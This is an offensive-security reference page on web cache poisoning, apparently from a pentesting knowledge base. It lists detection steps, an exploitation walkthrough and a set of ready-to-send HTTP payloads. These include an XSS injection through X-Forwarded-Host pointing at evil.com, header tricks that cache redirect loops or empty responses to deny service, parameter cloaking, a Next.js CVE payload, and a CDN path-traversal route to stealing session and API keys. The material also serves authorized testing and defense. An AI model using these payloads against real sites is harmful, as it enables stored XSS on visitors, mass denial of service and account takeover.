# Cache Poisoning

> **Summary**: Manipulating unkeyed inputs (headers, params, cookies) to inject malicious content into cached responses served to other users.
> **Impact**: Stored XSS on all visitors, mass phishing via redirect poisoning, denial of service, account takeover via API key theft.
> **Typical Severity**: High | Critical

**Note**: Cache poisoning stores attacker-controlled content in the cache. For attacks that trick the cache into storing a victim's sensitive data, see [Cache Deception](cache-deception.md).

## Detection

### Indicators

- Response headers indicating caching: `X-Cache: HIT`, `CF-Cache-Status: HIT`, `Age: <seconds>`, `Cache-Control: public, max-age=<N>`
- `Vary` header revealing which request headers are part of the cache key
- Reflected content from unkeyed headers (e.g., `X-Forwarded-Host`, `X-Forwarded-Scheme`)
- Behavior differences between authenticated and anonymous requests (different cache keys)

### Automated Detection

```bash
# Web Cache Vulnerability Scanner
wcvs -u https://<TARGET>/ -gr

# Param Miner (Burp Extension) - brute-forces unkeyed headers and params
# Install via BApp Store, right-click request -> "Guess headers" / "Guess params"
```

### Manual Detection

1. **Confirm caching**: Send a request, check for `X-Cache: miss`, resend and look for `X-Cache: hit`
2. **Use a cache buster**: Append a unique query param (e.g., `?cb=<RANDOM>`) to isolate your tests
3. **Fuzz unkeyed inputs**: Add headers like `X-Forwarded-Host: evil.com` and check if the value is reflected
4. **Test error code caching**: Send a request with an intentionally bad header to trigger a 400; re-request normally -- if 400 is returned, the error response was cached
5. **Compare cache keys**: Check if authenticated vs anonymous traffic uses different keys; fuzz rarely-keyed headers like `Content-Type`

## Exploitation

### Prerequisites

- A caching layer (CDN, reverse proxy, application cache) in front of the origin
- At least one unkeyed input that influences the response content
- Ability to trigger cache storage of the poisoned response

### Step-by-Step

1. **Identify unkeyed inputs** -- Use Param Miner to brute-force headers and parameters that change the response but are not part of the cache key
   - Success: Response content changes when injecting a header, but the cached version still serves the poisoned content
2. **Craft the malicious response** -- Inject a payload via the unkeyed input (XSS, redirect, DoS content)
3. **Ensure the response is cached** -- Repeat the poisoned request until `X-Cache: hit` confirms storage
4. **Verify cross-user impact** -- Access the same URL from a different session/browser without the injection header; confirm the poisoned response is served
5. **Targeted poisoning (optional)** -- If the `Vary` header includes `User-Agent`, match the victim's UA to poison their specific cache variant

### Payloads (organized by technique)

#### Unkeyed Header Injection (XSS via X-Forwarded-Host)

```http
GET /en?region=uk HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>
```

#### Scheme Poisoning (Redirect Loop via X-Forwarded-Scheme)

```http
GET /static/logo.png HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http
```

Causes a cached 301 redirect loop, denying access to the static asset for all users.

#### Method Override DoS (X-HTTP-Method-Override)

```http
GET /static/app.js HTTP/1.1
Host: target.com
X-HTTP-Method-Override: HEAD
```

Returns empty body with `Content-Length: 0`, cached for all GET requests -- effectively removing the JS bundle.

#### Multiple Unkeyed Headers (Redirect + Scheme)

```http
GET /resources/js/tracking.js HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
```

#### Host Header Case Normalization

```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```

Some CDNs normalize to lowercase for cache keys but forward raw casing to origin, causing different behavior.

### Fat GET

GET request with a body. Cache keys the URL param, but the server processes the body param:

```http
GET /contact/report-abuse?report=innocent HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=attacker-value
```

### Parameter Cloaking

Discrepancy in parameter parsing between cache and origin (e.g., `;` vs `&` as separator):

```http
GET /?language=en&a=b;language=de HTTP/1.1
Host: target.com
```

Cache keys `language=en`, origin processes `language=de`.

### Cache Poisoning to DoS

| Technique | Description |
|-----------|-------------|
| HTTP Header Oversize (HHO) | Send a header larger than origin allows but within cache limit; 400 gets cached |
| HTTP Meta Character (HMC) | Inject `\n`, `\r` in headers; origin errors, cache stores the error |
| Unkeyed Port | `Host: target.com:1` -- redirect to non-existent port gets cached |
| Long Redirect | `GET /login?x=<VERY_LONG_STRING>` -- 414 error gets cached for `/login/` |
| Fat GET body | Some servers reject GET with body (403); that rejection gets cached |

### CDN-Specific Techniques

| CDN | Behavior |
|-----|----------|
| **Cloudflare** | Caches based on file extension (`.js`, `.css`, `.png`, etc.); case-normalizes `Host` for cache keys |
| **Akamai** | Often includes custom headers in cache keys; test with `Pragma: akamai-x-cache-on` |
| **Fastly/Varnish** | May cache specific GET params (e.g., `size`); URL-encoded param variants may bypass keying |

### Next.js Specific

```http
GET /<PAGE_PATH> HTTP/1.1
Host: target.com
x-middleware-prefetch: 1
```

Poisons a page with empty JSON data (CVE-2023-46298). Also try `Rsc: 1`.

### Proof of Concept

1. Add cache buster: `GET /page?cb=test123`
2. Inject: `X-Forwarded-Host: <ATTACKER_DOMAIN>`
3. Repeat until `X-Cache: hit`
4. Open the URL in incognito without the header -- confirm injected content appears

## Bypasses

- If `Vary: User-Agent` limits poisoning scope, exfiltrate the victim's UA first (e.g., via analytics) and match it
- If cache keys include some headers, look for **other** unkeyed headers (e.g., `X-Original-URL`, `X-Rewrite-URL`)
- Use URL discrepancies: delimiters (`;`, `%00`, `%0a`) or dot-segments (`/../`) that the cache and origin parse differently
- Path traversal through CDN: `GET /share/%2F..%2Fapi/auth/session` -- CDN caches under `/share/*`, origin resolves `/api/auth/session`
- Probe for exposed cache maintenance verbs: `PURGE`, `BAN` to flush and re-poison on demand

## Escalation

- **Cache Poisoning -> Stored XSS**: Inject `<script>` via unkeyed header reflection
- **Cache Poisoning -> ATO**: Steal API keys via path traversal through CDN (e.g., OpenAI ChatGPT ATO)
- **Cache Poisoning -> Mass DoS**: Poison critical JS/CSS assets with empty or error responses
- **Via [Request Smuggling](request-smuggling.md)**: Smuggle a request that poisons the cache for a high-value static resource
- **Via [CORS](cors.md) misconfiguration**: Poison `Access-Control-Allow-Origin` to enable cross-origin data theft

## Cacheable Extensions

```
js, css, png, jpg, jpeg, gif, ico, svg, woff, woff2, ttf, eot,
pdf, mp3, mp4, avi, webm, webp, json, xml, zip, gz, tar, 7z
```

## Tools

| Tool | Usage |
|------|-------|
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension to brute-force unkeyed headers/params |
| [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) | `wcvs -u <URL>` -- automated cache poisoning detection |
| [toxicache](https://github.com/xhzeem/toxicache) | Golang scanner for cache poisoning across URL lists |
| [CacheDecepHound](https://github.com/g4nkd/CacheDecepHound) | Python scanner for cache deception vulnerabilities |

## References

- [PortSwigger - Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [PortSwigger Research - Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [PortSwigger Research - Gotta Cache Em All](https://portswigger.net/research/gotta-cache-em-all)
- [PayloadsAllTheThings - Web Cache Poisoning](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Poisoning)
- [0xAwali - Beyond Web Caching Vulnerabilities](https://medium.com/@0xAwali/beyond-web-caching-vulnerabilities-c617d8cdbb85)
- [Cache Poisoning Case Studies](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)
- [ChatGPT ATO via Cache Poisoning](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)

**See also**: [Cache Deception](cache-deception.md) | [Request Smuggling](request-smuggling.md) | [CORS](cors.md)
